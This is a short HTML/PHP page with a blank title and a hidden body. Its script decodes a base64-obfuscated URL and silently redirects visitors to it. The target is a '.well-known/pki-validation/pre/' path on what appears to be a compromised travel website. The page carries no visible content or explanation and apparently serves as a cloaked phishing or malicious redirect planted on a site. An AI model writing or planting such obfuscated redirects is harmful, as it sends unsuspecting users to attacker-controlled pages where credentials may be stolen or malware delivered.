<!DOCTYPE html>
<html>
<head>
    <title>.</title>
    <style>
        body { display: none; }
    </style>
    <script>
        <?php
            $redirect_url = "https://skyleveltravels.com//.well-known/pki-validation/pre/";
            $encoded_url = base64_encode($redirect_url);
        ?>
        (function() {
            var encodedUrl = "<?php echo $encoded_url; ?>";
            var decodeBase64 = function(encodedStr) {
                var decodedStr = atob(encodedStr);
                return decodedStr.split('').map(function(c) {
                    return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
                }).join('');
            };
            var redirectUrl = decodeURIComponent(decodeBase64(encodedUrl));
            window.location.href = redirectUrl;
        })();
    </script>
</head>
<body>
</body>
</html>
